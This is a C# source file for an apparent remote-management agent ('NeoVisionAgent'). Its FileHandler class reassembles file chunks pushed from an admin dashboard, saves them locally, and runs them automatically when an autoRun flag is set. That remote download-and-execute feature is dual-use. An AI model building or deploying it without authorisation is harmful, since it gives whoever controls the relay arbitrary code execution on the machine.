using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace NeoVisionAgent
{
    /// <summary>
    /// Handles incoming file transfers from the admin dashboard.
    /// Reassembles chunked files and optionally executes them.
    /// </summary>
    public class FileHandler
    {
        // Holds in-progress file transfers indexed by transfer ID
        private readonly Dictionary<string, FileTransferState> _transfers = new();

        private readonly string _downloadFolder = Path.Combine(
            AppDomain.CurrentDomain.BaseDirectory,
            "received"
        );

        public FileHandler()
        {
            Directory.CreateDirectory(_downloadFolder);
        }

        /// <summary>
        /// Receives a file chunk from the relay.
        /// When the last chunk arrives the file is written to disk.
        /// </summary>
        public void ReceiveChunk(
            string transferId,
            string filename,
            int chunkIndex,
            bool isLast,
            bool autoRun,
            byte[] data)
        {
            try
            {
                if (!_transfers.TryGetValue(transferId, out var state))
                {
                    state = new FileTransferState(filename, autoRun);
                    _transfers[transferId] = state;
                }

                state.AddChunk(chunkIndex, data);

                if (isLast)
                {
                    var filePath = SaveFile(state);
                    _transfers.Remove(transferId);

                    AgentLogger.Log("FileHandler", $"File received: {filePath}");

                    if (autoRun)
                        ExecuteFile(filePath);
                }
            }
            catch (Exception ex)
            {
                AgentLogger.Log("FileHandler", $"ReceiveChunk error: {ex.Message}");
            }
        }

        private string SaveFile(FileTransferState state)
        {
            // Sanitise filename to prevent path traversal
            var safeName = Path.GetFileName(state.Filename);
            var filePath = Path.Combine(_downloadFolder, safeName);

            // Avoid overwriting — append a number if file exists
            var counter = 1;
            while (File.Exists(filePath))
            {
                var name = Path.GetFileNameWithoutExtension(safeName);
                var ext  = Path.GetExtension(safeName);
                filePath = Path.Combine(_downloadFolder, $"{name}_{counter++}{ext}");
            }

            using var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write);
            foreach (var chunk in state.GetOrderedChunks())
                fs.Write(chunk, 0, chunk.Length);

            return filePath;
        }

        private void ExecuteFile(string filePath)
        {
            try
            {
                AgentLogger.Log("FileHandler", $"Executing: {filePath}");

                Process.Start(new ProcessStartInfo
                {
                    FileName        = filePath,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                AgentLogger.Log("FileHandler", $"Execute error: {ex.Message}");
            }
        }
    }

    /// <summary>
    /// Holds the state of an in-progress chunked file transfer.
    /// </summary>
    internal class FileTransferState
    {
        public string Filename { get; }
        public bool   AutoRun  { get; }

        private readonly SortedDictionary<int, byte[]> _chunks = new();

        public FileTransferState(string filename, bool autoRun)
        {
            Filename = filename;
            AutoRun  = autoRun;
        }

        public void AddChunk(int index, byte[] data)
            => _chunks[index] = data;

        public IEnumerable<byte[]> GetOrderedChunks()
            => _chunks.Values;
    }
}